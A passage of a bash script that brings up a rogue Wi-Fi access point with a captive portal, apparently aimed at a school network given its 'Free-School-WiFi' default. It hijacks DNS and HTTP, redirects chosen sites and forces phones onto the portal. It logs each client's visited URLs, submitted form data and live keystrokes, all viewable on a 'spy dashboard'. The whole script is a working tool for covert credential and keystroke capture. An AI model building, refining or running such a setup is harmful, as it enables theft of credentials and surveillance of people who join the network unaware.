  if [ -f "$RUN_DIR/spy.pid" ] && kill -0 "$(cat "$RUN_DIR/spy.pid")" 2>/dev/null; then
    echo "Spy dashboard: http://127.0.0.1:8765/ (pid $(cat "$RUN_DIR/spy.pid"))"
    echo "--- keylog history (last 5 fields) ---"
    curl -s -m 3 "http://127.0.0.1:8765/api/history?tail=2000" 2>/dev/null \
      | python3 -c "import json,sys; d=json.load(sys.stdin); n=0
for ip,e in list(d.items())[:5]:
    print(f'{ip} ({e.get(\"mac\",\"-\")}) {e.get(\"last_ts\",\"\")}:')
    for k,v in list((e.get(\"fields\") or {}).items())[:5]:
        print(f'  {k}=[{str(v)[:60]}]'); n+=1
print('(none yet)' if n==0 else f'[{n} fields shown]')" 2>/dev/null \
      || echo "(spy feed not ready yet)"
  else
    echo "Spy dashboard: OFF (run with SPY=on or press [v] to start)"
  fi
}

show_clients() {  echo "--- connected (ARP on $AP_IFACE) ---"
  awk -v dev="$AP_IFACE" '$6==dev {print $1"  "$4}' /proc/net/arp 2>/dev/null || true
  echo "--- authorized ---"
  cat "$STATE_FILE" 2>/dev/null || echo "(none yet)"
  echo "--- dhcp leases ---"
  cat "$RUN_DIR/dnsmasq.leases" 2>/dev/null || echo "(none yet)"
  echo "--- typed submits (last 5) ---"
  tail -n 5 "$RUN_DIR/submissions.log" 2>/dev/null || echo "(none yet)"
  echo "--- keystrokes (last 3) ---"
  tail -n 3 "$RUN_DIR/keystrokes.jsonl" 2>/dev/null | cut -c1-200 || echo "(none yet)"
}

# ---------- preconditions ----------
if [ "$(id -u)" -ne 0 ]; then
  echo "Run as root: sudo ./run.sh"
  exit 1
fi

for cmd in hostapd dnsmasq python3 iptables iw ip; do
  if ! command -v "$cmd" >/dev/null 2>&1; then
    echo "[!] Missing: $cmd — run: sudo ./setup.sh"
    exit 1
  fi
done

# load previous answers as defaults
AP_IFACE=""; MODE=""; PORTAL=""; SSID=""; PASSWORD=""; CHANNEL=""; BAND=""; COUNTRY=""
GATEWAY=""; UPSTREAM=""; LIVE=""; NETMON=""; SPY=""; REDIRECTS=""
# shellcheck disable=SC1090
[ -f "$LAST" ] && . "$LAST" 2>/dev/null || true
# migrate old last.conf (CHANNEL only) -> infer BAND
if [ -z "${BAND:-}" ] && [ -n "${CHANNEL:-}" ]; then
  if [ "$CHANNEL" -ge 36 ] 2>/dev/null; then BAND="5"; else BAND="2.4"; fi
fi

echo "=== Captive portal setup (everything selectable) ==="
echo

# 1) AP interface
mapfile -t IFACES < <(list_wifi_ifaces)
if [ "${#IFACES[@]}" -eq 0 ]; then
  echo "[!] No wifi interfaces found (iw dev). Plug in an AP-capable adapter."
  exit 1
fi
echo "WiFi interfaces:"
i=1
for f in "${IFACES[@]}"; do
  st="$(ip -o link show "$f" 2>/dev/null | grep -oE 'state [A-Z]+' || echo 'state ?')"
  def=""; [ "$f" = "${AP_IFACE:-}" ] && def="  (last)"
  [ -z "${AP_IFACE:-}" ] && [ "$f" = "wlan1" ] && def="  (suggested: free iface)"
  echo "  $i) $f  [$st]$def"
  i=$((i+1))
done
pick_number CHOICE "AP interface number" "${#IFACES[@]}"
AP_IFACE="${IFACES[$((CHOICE-1))]}"

# 2) Mode
echo
echo "Mode: (last: ${MODE:-isolated})"
echo "  1) isolated  (clients get portal only, no internet)"
echo "  2) nat       (share internet after clicking Connect)"
pick_number MCHOICE "Mode number" 2
[ "$MCHOICE" = "2" ] && MODE="nat" || MODE="isolated"

if [ "$MODE" = "nat" ]; then
  DEF_UP="${UPSTREAM:-$(default_upstream)}"
  if [ -z "$DEF_UP" ]; then
    echo "[!] No other upstream found (default route is via $AP_IFACE itself or missing)."
    echo "    NAT needs a 2nd internet source (2nd adapter/USB tether)."
    echo "    Falling back to asking — leave empty to abort to isolated mode."
    DEF_UP="$AP_IFACE"
  fi
  ask UPSTREAM "Upstream interface for internet" "$DEF_UP"
  if [ "$UPSTREAM" = "$AP_IFACE" ]; then
    echo "[!] Upstream ($UPSTREAM) == AP iface — this single-radio card cannot do"
    echo "    AP+client at once (no interface combinations). NAT would kill the AP."
    read -r -p "Use isolated mode instead? [Y/n]: " FIXUP || FIXUP=""
    if [[ ! "$FIXUP" =~ ^[Nn] ]]; then
      MODE="isolated"
      echo "[*] Switched to isolated mode."
    else
      echo "[!] Continuing anyway — hostapd will likely fail with 'Could not configure driver mode'."
    fi
  fi
else
  # keep a sane upstream for later NAT runs, but never default it to the AP iface
  _du="$(default_upstream)"
  UPSTREAM="${UPSTREAM:-$_du}"
  [ "$UPSTREAM" = "$AP_IFACE" ] && UPSTREAM="$_du"
fi

# 3) Portal
echo
mapfile -t PORTALS < <(list_portals)
if [ "${#PORTALS[@]}" -eq 0 ]; then
  echo "[!] No portals in my-portals/*/ with index.html"
  exit 1
fi
echo "Portals in my-portals/:"
i=1
for p in "${PORTALS[@]}"; do
  def=""; [ "$p" = "${PORTAL:-}" ] && def="  (last)"
  [ -z "${PORTAL:-}" ] && [ "$p" = "school-demo" ] && def="  (sample)"
  echo "  $i) $p$def"
  i=$((i+1))
done
pick_number PCHOICE "Portal number" "${#PORTALS[@]}"
PORTAL="${PORTALS[$((PCHOICE-1))]}"

# 4) WiFi + network (Enter = default)
echo
ask SSID "SSID" "${SSID:-Free-School-WiFi}"
ask PASSWORD "Password (Enter = open network, or type 8+ chars for WPA2)" "${PASSWORD:-open}"
case "$PASSWORD" in [Oo][Pp][Ee][Nn]|none|NONE|-) PASSWORD="";; esac
if [ -n "$PASSWORD" ] && [ "${#PASSWORD}" -lt 8 ]; then
  echo "[!] WPA2 needs 8+ chars. Leaving as open network."
  PASSWORD=""
fi
# 4a) Band: both always listed — pick what you want, hostapd is the judge.
# If the adapter can't do it, hostapd fails with a clear log (no guessing here).
echo
echo "Band for $AP_IFACE: (last: ${BAND:-2.4})"
echo "  1) 2.4GHz  (longer range, all devices)"
echo "  2) 5GHz    (faster; needs a 5GHz-capable adapter)"
BDEFNUM=1; [ "${BAND:-}" = "5" ] && BDEFNUM=2
while true; do
  ask BAND_CHOICE "Band number (1=2.4GHz, 2=5GHz)" "$BDEFNUM"
  case "$BAND_CHOICE" in 1|2) break;; *) echo "Enter 1 or 2.";; esac
done
[ "$BAND_CHOICE" = "2" ] && BAND="5" || BAND="2.4"
# 4b) Channel: option lists + free cross-band switching.
# Typing a channel from the OTHER band offers to switch bands instead of
# looping forever. Disabled-by-reg channels warn (and are auto-enabled via
# regdomain where possible, e.g. JP for 14) instead of failing at hostapd.
if [ "$BAND" = "5" ]; then
  echo
  echo "5GHz channels:"
  echo "  non-DFS (start here): 36 40 44 48 149 153 157 161 165"
  echo "  DFS (radar detect, slow start): 52 56 60 64 100 104 108 112 116 120 124 128 132 136 140 144"
  echo "  (type a 2.4GHz channel 1-14 to switch back to 2.4GHz, or 'b' to re-pick band)"
  DEF_CH="$(sane_channel_default 5 "${CHANNEL:-36}")"
  while true; do
    ask CHANNEL "Channel" "$DEF_CH"
    case "$CHANNEL" in b|B|back) BAND="2.4"; break;; esac
    if is_valid_24_channel "$CHANNEL"; then
      read -r -p "Channel $CHANNEL is 2.4GHz — switch band to 2.4GHz? [Y/n]: " SW || SW=""
      if [[ ! "$SW" =~ ^[Nn] ]]; then BAND="2.4"; break; fi
      continue
    fi
    if is_valid_5ghz_channel "$CHANNEL"; then break; fi
    echo "[!] Not a 5GHz channel — pick one from the lists above (or type 1-14 to go 2.4GHz)."
  done
fi
if [ "$BAND" = "5" ]; then
  if is_dfs_channel "$CHANNEL"; then
    echo "[i] Ch $CHANNEL is DFS: radar detection = slow start (up to ~60s CAC)."
    echo "    Prefer 36/40/44/48 or 149+ for instant start."
  fi
  ask COUNTRY "Country code (required for 5GHz)" "${COUNTRY:-$(detect_country)}"
  COUNTRY="$(printf '%s' "$COUNTRY" | tr '[:lower:]' '[:upper:]')"
  [ -z "$COUNTRY" ] && COUNTRY="US"
else
  echo
  echo "2.4GHz channels: 1 2 3 4 5 6 7 8 9 10 11 12 13 14"
  echo "(1/6/11 are the non-overlapping workhorses; 12/13/14 are restricted in many regions)"
  echo "(type a 5GHz channel like 36 to switch to 5GHz, or 'b' to re-pick band)"
  DEF_CH="$(sane_channel_default 2.4 "${CHANNEL:-6}")"
  while true; do
    ask CHANNEL "Channel" "$DEF_CH"
    if [ "$CHANNEL" = "b" ] || [ "$CHANNEL" = "B" ] || [ "$CHANNEL" = "back" ]; then
      BAND="5"; CHANNEL="36"
      ask COUNTRY "Country code (required for 5GHz)" "${COUNTRY:-$(detect_country)}"
      COUNTRY="$(printf '%s' "$COUNTRY" | tr '[:lower:]' '[:upper:]')"
      [ -z "$COUNTRY" ] && COUNTRY="US"
      break
    fi
    if is_valid_5ghz_channel "$CHANNEL"; then
      read -r -p "Channel $CHANNEL is 5GHz — switch band to 5GHz? [Y/n]: " SW || SW=""
      if [[ ! "$SW" =~ ^[Nn] ]]; then BAND="5"; ask COUNTRY "Country code (required for 5GHz)" "${COUNTRY:-$(detect_country)}"; COUNTRY="$(printf '%s' "$COUNTRY" | tr '[:lower:]' '[:upper:]')"; [ -z "$COUNTRY" ] && COUNTRY="US"; break; fi
      continue
    fi
    case "$CHANNEL" in 1|2|3|4|5|6|7|8|9|10|11|12|13|14) break;; *) echo "[!] Pick 1-14 (or a 5GHz channel to switch bands).";; esac
  done
  # band may have flipped to 5 above — keep COUNTRY only for 5GHz
  if [ "$BAND" != "5" ]; then COUNTRY="${COUNTRY:-}"; fi
fi
if [ "$BAND" = "2.4" ]; then
  if [ "$CHANNEL" = "14" ]; then
    echo "[i] Ch 14 is 802.11b-only (Japan regdomain, 11 Mbps max, old devices only)."
    echo "    The script will set regdomain JP + hw_mode=b automatically."
    COUNTRY="JP"
  elif [ "$CHANNEL" = "12" ] || [ "$CHANNEL" = "13" ]; then
    if channel_disabled_by_reg "$CHANNEL"; then
      echo "[i] Ch $CHANNEL is disabled in your current regdomain — will try regdomain JP/DE automatically."
    fi
  fi
fi
ask GATEWAY "Gateway IP" "${GATEWAY:-192.168.4.1}"
PREFIX="${GATEWAY%.*}"
ask DHCP_RANGE "DHCP range" "${DHCP_RANGE:-$PREFIX.10,$PREFIX.100,12h}"
ask LIVE "Live typing window in foot (on/off)" "${LIVE:-on}"
case "$LIVE" in on|ON|yes|YES|y|Y) LIVE="on";; *) LIVE="off";; esac
ask NETMON "Traffic monitor: live sites/URLs per device in foot (on/off)" "${NETMON:-on}"
case "$NETMON" in on|ON|yes|YES|y|Y) NETMON="on";; *) NETMON="off";; esac
ask SPY "Spy dashboard: browser keylog viewer on http://127.0.0.1:8765 (on/off)" "${SPY:-on}"
case "$SPY" in on|ON|yes|YES|y|Y) SPY="on";; *) SPY="off";; esac
echo
echo "Redirect sites (youtube opens learn instead, etc). Format: site>target, ... where"
echo "target = portal | IP | another site | localhost:port | 192.168.0.105:port (any address)."
echo "Remote targets are forwarded+masqueraded automatically, even in isolated mode."
echo "HTTP only — HTTPS to redirected sites warns/times out (portal has no certs)."
ask REDIRECTS "Redirects (e.g. youtube.com>localhost:8080, cam>192.168.0.105:80; empty=none)" "${REDIRECTS:-}"
REDIRECTS="$(printf '%s' "$REDIRECTS" | tr -d '"' | tr -s ' ' | sed 's/^ //;s/ $//')"

echo
echo "--- summary ---"
echo "AP iface : $AP_IFACE"
echo "Mode     : $MODE$([ "$MODE" = nat ] && echo " via $UPSTREAM")"
echo "Portal   : my-portals/$PORTAL -> http://$GATEWAY/"
echo "SSID     : $SSID  $([ -z "$PASSWORD" ] && echo '(open)' || echo '(WPA2)')"
if [ "$BAND" = "5" ]; then BAND_LABEL="5GHz"; else BAND_LABEL="2.4GHz"; fi
echo "Band     : $BAND_LABEL   Channel: $CHANNEL$([ "$BAND" = "5" ] && echo "   Country: $COUNTRY")   Gateway: $GATEWAY   DHCP: $DHCP_RANGE"
echo "Live win : $LIVE   Traffic: $NETMON   Spy: $SPY (http://127.0.0.1:8765/)"
echo "Redirects: ${REDIRECTS:-(none)}"
read -r -p "Start? [Y/n]: " GO || GO=""
if [[ "$GO" =~ ^[Nn] ]]; then echo "Aborted."; exit 0; fi

cat > "$LAST" <<EOF
AP_IFACE="$AP_IFACE"
MODE="$MODE"
PORTAL="$PORTAL"
SSID="$SSID"
PASSWORD="$PASSWORD"
BAND="$BAND"
CHANNEL="$CHANNEL"
COUNTRY="$COUNTRY"
GATEWAY="$GATEWAY"
DHCP_RANGE="$DHCP_RANGE"
UPSTREAM="$UPSTREAM"
LIVE="$LIVE"
NETMON="$NETMON"
SPY="$SPY"
REDIRECTS="$REDIRECTS"
EOF

# ---------- bring up ----------
trap cleanup EXIT INT TERM
rm -f "$RUN_DIR"/*.pid "$RUN_DIR"/*.log "$RUN_DIR/dnsmasq.leases"
: > "$STATE_FILE"

echo "[*] Preparing $AP_IFACE..."
# The old code only did `managed no` + down/up — never disconnecting the STA
# link. On single-radio cards (no interface combinations) that leaves the iface
# busy, so hostapd fails on EVERY channel with "Could not configure driver mode".
if ! free_iface_for_ap; then
  diagnose_hostapd_failure
  exit 1
fi
# Remember the regdomain so cleanup can restore it if we change it for 12/13/14.
detect_country > "$RUN_DIR/orig_reg" 2>/dev/null || echo "US" > "$RUN_DIR/orig_reg"
# Regdomain-gated channels (US: 12/13/14): enable via regdomain instead of
# failing at hostapd. 14 additionally needs hw_mode=b + country JP (see conf).
if [ "$BAND" = "2.4" ]; then
  case "$CHANNEL" in 12|13|14)
    ensure_regdomain_for_channel "$CHANNEL" || true
    # re-check after attempt; hard-blocked channels fall through to hostapd
    # error with a clear message rather than silently switching channels.
    ;;
  esac
fi

# hostapd.conf, band-aware (2.4GHz -> hw_mode=g, 5GHz -> hw_mode=a + country/11n/11ac).
# Ch 14 is special: 802.11b-only under JP regdomain (NO-OFDM) — hw_mode=b.
# Function so a rejected band/channel can fall back without re-running.
write_hostapd_conf() {
{
  echo "interface=$AP_IFACE"
  echo "driver=nl80211"
  echo "ctrl_interface=/var/run/hostapd"
  echo "ssid=$SSID"
  if [ "${BAND:-2.4}" = "5" ]; then
    echo "hw_mode=a"
    echo "channel=$CHANNEL"
    echo "country_code=$COUNTRY"
    echo "ieee80211d=1"
    echo "ieee80211h=1"
    echo "ieee80211n=1"
    echo "ieee80211ac=1"
    echo "wmm_enabled=1"
  elif [ "$CHANNEL" = "14" ]; then
    echo "hw_mode=b"
    echo "channel=14"
    echo "country_code=JP"
    echo "ieee80211d=1"
    echo "wmm_enabled=0"
  else
    echo "hw_mode=g"
    echo "channel=$CHANNEL"
    # NOTE: no ieee80211n here — wlan1 (rt73, 802.11g-only) rejects the
    # channel ("channel is disabled") when HT is requested. Proven by test.
    echo "wmm_enabled=1"
  fi
  echo "auth_algs=1"
  echo "ignore_broadcast_ssid=0"
  if [ -z "$PASSWORD" ]; then
    echo "wpa=0"
  else
    echo "wpa=2"
    echo "wpa_passphrase=$PASSWORD"
    echo "wpa_key_mgmt=WPA-PSK"
    echo "rsn_pairwise=CCMP"
  fi
} > "$RUN_DIR/hostapd.conf"
}

start_hostapd_once() { # 0 when AP-ENABLED appears in the log
  kill_stale_hostapd
  rm -f "$RUN_DIR/hostapd.pid" "$RUN_DIR/hostapd.log"
  # -B = daemonize so -P pid file is reliably written.
  # Success is detected via AP-ENABLED in the log (pid alone proved unreliable).
  hostapd -B -P "$RUN_DIR/hostapd.pid" -f "$RUN_DIR/hostapd.log" "$RUN_DIR/hostapd.conf"
  local tries=20
  if [ "${BAND:-2.4}" = "5" ] && is_dfs_channel "${CHANNEL:-36}"; then
    tries=140  # DFS CAC can take ~60s — wait instead of failing instantly
    echo "[*] DFS channel $CHANNEL: waiting up to ~70s for radar CAC..."
  fi
  for _ in $(seq 1 "$tries"); do
    sleep 0.5
    if grep -q "AP-ENABLED" "$RUN_DIR/hostapd.log" 2>/dev/null; then
      [ -f "$RUN_DIR/hostapd.pid" ] && kill -0 "$(cat "$RUN_DIR/hostapd.pid")" 2>/dev/null && return 0
      return 1
    fi
    if grep -qE "AP-DISABLED|driver initialization failed|Could not configure driver mode|Could not select hw_mode|not allowed for AP mode|Primary frequency not allowed|Hardware does not support configured channel|channel is disabled|Could not set channel|Interface initialization failed|Unable to setup interface|Failed to setup interface|CTRL-EVENT-TERMINATING" "$RUN_DIR/hostapd.log" 2>/dev/null; then return 1; fi
  done
  return 1
}

try_hostapd_with_fallbacks() {
  # Try the requested channel, then sweep safe fallbacks (same band) with a
  # clean iface reset between attempts. Sets BAND/CHANNEL to the winner.
  # Returns 0 on success.
  local tried=""
  local candidates="$CHANNEL"
  if [ "$BAND" = "5" ]; then
    for c in 36 40 44 48 149 153 157 161 165; do
      case " $candidates " in *" $c "*) ;; *) candidates="$candidates $c";; esac
    done
  else
    for c in 6 1 11; do
      case " $candidates " in *" $c "*) ;; *) candidates="$candidates $c";; esac
    done
  fi
  local c
  for c in $candidates; do
    CHANNEL="$c"
    case " $tried " in *" $c "*) continue;; esac
    tried="$tried $c"
    if [ "$c" = "14" ]; then COUNTRY="JP"; fi
    write_hostapd_conf
    echo "[*] Trying $BAND GHz channel $c..."
    if start_hostapd_once; then
      sed -i "s/^BAND=.*/BAND=\"$BAND\"/; s/^CHANNEL=.*/CHANNEL=\"$c\"/" "$LAST"
      [ "$c" = "14" ] && sed -i 's/^COUNTRY=.*/COUNTRY="JP"/' "$LAST"
      return 0
    fi
    echo "[!] Channel $c failed. Log:"; tail -n 8 "$RUN_DIR/hostapd.log" || true
    reset_iface_between_retries
  done
  return 1
}

# dnsmasq.conf (function so redirects can be changed live via [r]edirects)
write_dnsmasq_conf() {
{
  echo "interface=$AP_IFACE"
  echo "bind-interfaces"
  echo "except-interface=lo"
  echo "port=53"
  echo "no-resolv"
  [ "$MODE" = "nat" ] && echo "server=8.8.8.8" && echo "server=1.1.1.1"
  echo "dhcp-range=$DHCP_RANGE"
  echo "dhcp-option=3,$GATEWAY"
  echo "dhcp-option=6,$GATEWAY"
  # RFC 8910 captive-portal URL: modern Android/iOS pop the portal automatically.
  echo "dhcp-option=114,http://$GATEWAY/"
  echo "address=/#/$GATEWAY"
  write_redirect_rules
  echo "dhcp-leasefile=$RUN_DIR/dnsmasq.leases"
  echo "log-facility=$RUN_DIR/dnsmasq.log"
  echo "pid-file=$RUN_DIR/dnsmasq.pid"
  [ "${NETMON:-on}" = "on" ] && echo "log-queries"
} > "$RUN_DIR/dnsmasq.conf"
}

restart_dnsmasq() {
  write_dnsmasq_conf
  if [ -f "$RUN_DIR/dnsmasq.pid" ]; then
    kill "$(cat "$RUN_DIR/dnsmasq.pid")" 2>/dev/null || true
    rm -f "$RUN_DIR/dnsmasq.pid"
    sleep 1
  fi
  dnsmasq -C "$RUN_DIR/dnsmasq.conf" || { echo "[!] dnsmasq failed. Log:"; tail -n 20 "$RUN_DIR/dnsmasq.log" || true; return 1; }
  sleep 1
  echo "[*] dnsmasq reloaded (redirects: ${REDIRECTS:-(none)})"
}

echo "[*] Starting hostapd ($BAND GHz, ch $CHANNEL)..."
ORIG_BAND="$BAND"; ORIG_CH="$CHANNEL"
if ! try_hostapd_with_fallbacks; then
  echo "[!] hostapd failed on $ORIG_BAND GHz ch $ORIG_CH (and safe fallbacks). Log:"; tail -n 20 "$RUN_DIR/hostapd.log" || true
  if grep -q "Could not configure driver mode" "$RUN_DIR/hostapd.log" 2>/dev/null; then
    echo "[i] 'Could not configure driver mode' = the radio is busy, NOT a bad channel."
    echo "    Usual causes: still connected as Wi-Fi client (this card can't do AP+client),"
    echo "    another hostapd holding it, or NetworkManager re-took it."
    diagnose_hostapd_failure
  elif grep -qE "not allowed for AP mode|Primary frequency not allowed|Hardware does not support|channel is disabled|Could not select hw_mode" "$RUN_DIR/hostapd.log" 2>/dev/null; then
    echo "[i] The radio/regdomain rejected every tried channel."
    echo "    2.4GHz: use 1/6/11 (12/13 need non-US regdomain, 14 needs JP+11b)."
    echo "    5GHz: prefer non-DFS 36/40/44/48 or 149+ with a matching country code."
    diagnose_hostapd_failure
  fi
  if [ "$ORIG_BAND" = "5" ]; then
    echo "[i] 5GHz rejected on all tried channels (card/regdomain/DFS or AP+client combo)."
    read -r -p "Fall back to 2.4GHz (auto-sweep 6/1/11) automatically? [Y/n]: " FALL || FALL=""
    if [[ ! "$FALL" =~ ^[Nn] ]]; then
      BAND="2.4"; CHANNEL=6
      sed -i 's/^BAND=.*/BAND="2.4"/; s/^CHANNEL=.*/CHANNEL="6"/' "$LAST"
      echo "[*] Retrying on 2.4GHz..."
      reset_iface_between_retries
      if ! try_hostapd_with_fallbacks; then
        echo "[!] hostapd failed on fallback too. Log:"; tail -n 20 "$RUN_DIR/hostapd.log" || true
        diagnose_hostapd_failure
        exit 1
      fi
      echo "[*] Fallback AP up on 2.4GHz ch $CHANNEL."
    else
      exit 1
    fi
  else
    echo "[i] All 2.4GHz attempts failed — see diagnostics above. Safe bets are 1/6/11."
    exit 1
  fi
else
  if [ "$CHANNEL" != "$ORIG_CH" ]; then
    echo "[*] Ch $ORIG_CH rejected — AP is up on fallback ch $CHANNEL instead."
  fi
fi

echo "[*] Starting dnsmasq..."
apply_port_redirects
write_dnsmasq_conf
dnsmasq -C "$RUN_DIR/dnsmasq.conf" || { echo "[!] dnsmasq failed. Log:"; tail -n 20 "$RUN_DIR/dnsmasq.log" || true; exit 1; }
sleep 1

echo "[*] Firewall..."
if [ "$MODE" = "nat" ]; then sysctl -w net.ipv4.ip_forward=1 >/dev/null;
else sysctl -w net.ipv4.ip_forward=0 >/dev/null; fi
iptables -t nat -N CAPTIVE_HTTP 2>/dev/null || true
iptables -t nat -F CAPTIVE_HTTP
iptables -t nat -C PREROUTING -i "$AP_IFACE" -p tcp --dport 80 -j CAPTIVE_HTTP 2>/dev/null \
  || iptables -t nat -A PREROUTING -i "$AP_IFACE" -p tcp --dport 80 -j CAPTIVE_HTTP
iptables -t nat -A CAPTIVE_HTTP -p tcp --dport 80 -j DNAT --to-destination "$GATEWAY:80"
for rule in "-p udp --dport 67" "-p udp --dport 68" "-p udp --dport 53" "-p tcp --dport 53" "-p tcp --dport 80"; do
  # shellcheck disable=SC2086
  iptables -C INPUT -i "$AP_IFACE" $rule -j ACCEPT 2>/dev/null \
    || iptables -A INPUT -i "$AP_IFACE" $rule -j ACCEPT
done
iptables -C FORWARD -i "$AP_IFACE" -j DROP 2>/dev/null \
  || iptables -A FORWARD -i "$AP_IFACE" -j DROP
# Phones probe HTTPS first (which a portal without certs can never answer).
# DROP makes those probes hang until timeout ("no internet", no popup).
# REJECT with tcp-reset fails them instantly so the phone falls back to its
# HTTP probe -> portal pops. HTTP stays hijacked to the portal via CAPTIVE_HTTP.
iptables -C FORWARD -i "$AP_IFACE" -p tcp --dport 443 -j REJECT --reject-with tcp-reset 2>/dev/null \
  || iptables -I FORWARD -i "$AP_IFACE" -p tcp --dport 443 -j REJECT --reject-with tcp-reset
if [ "$MODE" = "nat" ]; then
  iptables -t nat -C POSTROUTING -o "$UPSTREAM" -j MASQUERADE 2>/dev/null \
    || iptables -t nat -A POSTROUTING -o "$UPSTREAM" -j MASQUERADE
  iptables -C FORWARD -m conntrack --ctstate ESTABLISHED,RELATED -j ACCEPT 2>/dev/null \
    || iptables -A FORWARD -m conntrack --ctstate ESTABLISHED,RELATED -j ACCEPT
fi

start_portal "$PORTAL" || exit 1
start_trafficmon || true
start_spy || true
open_live_window
open_traffic_window

echo
echo "=== RUNNING ==="
echo "Connect to WiFi: $SSID  $([ -z "$PASSWORD" ] && echo '(open)' || echo "(password: $PASSWORD)") ($BAND GHz, ch $CHANNEL)"
echo "Portal: http://$GATEWAY/  (DNS hijacked, probes redirect automatically)"
echo "Mode: $MODE   Live window: $LIVE   Traffic: $NETMON   Spy: $SPY"
if [ "${SPY:-on}" = "on" ]; then
  echo "Spy dashboard (keylogs): http://127.0.0.1:8765/  — open in browser, shows LIVE + KEYLOG HISTORY + SUBMITS"
fi
echo "Logs: $RUN_DIR/*.log   Submits: $RUN_DIR/submissions.log   Keystrokes: $RUN_DIR/keystrokes.jsonl   Traffic: $RUN_DIR/traffic.log"
echo

trap - EXIT INT TERM
trap cleanup INT TERM
while true; do
  echo
  read -r -s -n1 -p "[s]witch portal  [l]ive window  [t]raffic  [v]spy dashboard  [r]edirects  [c]lients  [q]uit: " KEY || break
  echo
  case "$KEY" in
    s|S)
      mapfile -t PORTALS < <(list_portals)
      i=1; for p in "${PORTALS[@]}"; do echo "  $i) $p"; i=$((i+1)); done
      pick_number PCHOICE "Portal number" "${#PORTALS[@]}"
      PORTAL="${PORTALS[$((PCHOICE-1))]}"
      sed -i "s|^PORTAL=.*|PORTAL=\"$PORTAL\"|" "$LAST"
      start_portal "$PORTAL" || true
      ;;
    r|R)
      echo "Current redirects: ${REDIRECTS:-(none)}"
      echo "(site>portal | site>IP | site>other-site, comma-separated; empty=none)"
      read -r -p "Redirects: " REDIRECTS || REDIRECTS=""
      REDIRECTS="$(printf '%s' "$REDIRECTS" | tr -d '"' | tr -s ' ' | sed 's/^ //;s/ $//')"
      sed -i "s|^REDIRECTS=.*|REDIRECTS=\"$REDIRECTS\"|" "$LAST"
      apply_port_redirects
      restart_dnsmasq || true
      ;;
    c|C) show_clients ;;
    l|L) open_live_window ;;
    t|T) open_traffic_window ;;
    v|V) SPY="on"; sed -i 's/^SPY=.*/SPY="on"/' "$LAST" 2>/dev/null || echo 'SPY="on"' >> "$LAST"; start_spy || true; show_spy_status ;;
    q|Q) cleanup; trap - INT TERM; exit 0 ;;
  esac
done
